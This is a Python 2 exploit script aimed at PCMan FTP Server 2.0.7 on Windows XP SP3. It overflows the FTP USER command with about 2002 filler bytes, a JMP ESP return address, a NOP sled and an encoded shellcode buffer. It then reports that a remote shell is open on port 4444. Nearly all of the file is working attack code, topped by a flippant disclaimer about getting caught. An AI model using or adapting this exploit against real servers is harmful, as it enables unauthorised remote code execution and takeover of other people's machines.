#!/usr/bin/python

# Exploit for PCMan FTP Server version 2.0.7
# Tested in: Windows XP SP3
# DISCLAIMER: I am not responsible if you get caught doing something you shouldn't ^^.

import socket
import sys
import struct
import os

buf =  ""
buf += "\xd9\xc0\xd9\x74\x24\xf4\x58\xba\xc3\xc8\x07\x95\x31"
buf += "\xc9\xb1\x53\x31\x50\x17\x83\xe8\xfc\x03\x93\xdb\xe5"
buf += "\x60\xef\x34\x6b\x8a\x0f\xc5\x0c\x02\xea\xf4\x0c\x70"
buf += "\x7f\xa6\xbc\xf2\x2d\x4b\x36\x56\xc5\xd8\x3a\x7f\xea"
buf += "\x69\xf0\x59\xc5\x6a\xa9\x9a\x44\xe9\xb0\xce\xa6\xd0"
buf += "\x7a\x03\xa7\x15\x66\xee\xf5\xce\xec\x5d\xe9\x7b\xb8"
buf += "\x5d\x82\x30\x2c\xe6\x77\x80\x4f\xc7\x26\x9a\x09\xc7"
buf += "\xc9\x4f\x22\x4e\xd1\x8c\x0f\x18\x6a\x66\xfb\x9b\xba"
buf += "\xb6\x04\x37\x83\x76\xf7\x49\xc4\xb1\xe8\x3f\x3c\xc2"
buf += "\x95\x47\xfb\xb8\x41\xcd\x1f\x1a\x01\x75\xfb\x9a\xc6"
buf += "\xe0\x88\x91\xa3\x67\xd6\xb5\x32\xab\x6d\xc1\xbf\x4a"
buf += "\xa1\x43\xfb\x68\x65\x0f\x5f\x10\x3c\xf5\x0e\x2d\x5e"
buf += "\x56\xee\x8b\x15\x7b\xfb\xa1\x74\x14\xc8\x8b\x86\xe4"
buf += "\x46\x9b\xf5\xd6\xc9\x37\x91\x5a\x81\x91\x66\x9c\xb8"
buf += "\x66\xf8\x63\x43\x97\xd1\xa7\x17\xc7\x49\x01\x18\x8c"
buf += "\x89\xae\xcd\x39\x81\x09\xbe\x5f\x6c\xe9\x6e\xe0\xde"
buf += "\x82\x64\xef\x01\xb2\x86\x25\x2a\x5b\x7b\xc6\x45\xc0"
buf += "\xf2\x20\x0f\xe8\x52\xfa\xa7\xca\x80\x33\x50\x34\xe3"
buf += "\x6b\xf6\x7d\xe5\xac\xf9\x7d\x23\x9b\x6d\xf6\x20\x1f"
buf += "\x8c\x09\x6d\x37\xd9\x9e\xfb\xd6\xa8\x3f\xfb\xf2\x5a"
buf += "\xa3\x6e\x99\x9a\xaa\x92\x36\xcd\xfb\x65\x4f\x9b\x11"
buf += "\xdf\xf9\xb9\xeb\xb9\xc2\x79\x30\x7a\xcc\x80\xb5\xc6"
buf += "\xea\x92\x03\xc6\xb6\xc6\xdb\x91\x60\xb0\x9d\x4b\xc3"
buf += "\x6a\x74\x27\x8d\xfa\x01\x0b\x0e\x7c\x0e\x46\xf8\x60"
buf += "\xbf\x3f\xbd\x9f\x70\xa8\x49\xd8\x6c\x48\xb5\x33\x35"
buf += "\x78\xfc\x19\x1c\x11\x59\xc8\x1c\x7c\x5a\x27\x62\x79"
buf += "\xd9\xcd\x1b\x7e\xc1\xa4\x1e\x3a\x45\x55\x53\x53\x20"
buf += "\x59\xc0\x54\x61"

#jmpesp 77FAB277
jmpesp = struct.pack("<I", 0x77FAB277)

hostname = sys.argv[1]
username = "A" * 2002 + jmpesp + "\x90" * 50 + buf + "\x90" * 20 + "C" * (2120 - 2002 - 74 - len(buf))
password = "A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((hostname,21))
    print "[+] El programa se pudo conectar al servidor."
    response = s.recv(2000)
    print response
except:
       print "[!] No se pudo conectar."
       response = s.recv(2000)
       print response
       sys.exit(1)

s.send("user %s\r\n" %username)
#response = s.recv(2000)
#print response

s.send("pass %s\r\n" %password)
#response = s.recv(2000)
#print response

print "[+] A shell has been opened in port 4444!"

s.close()
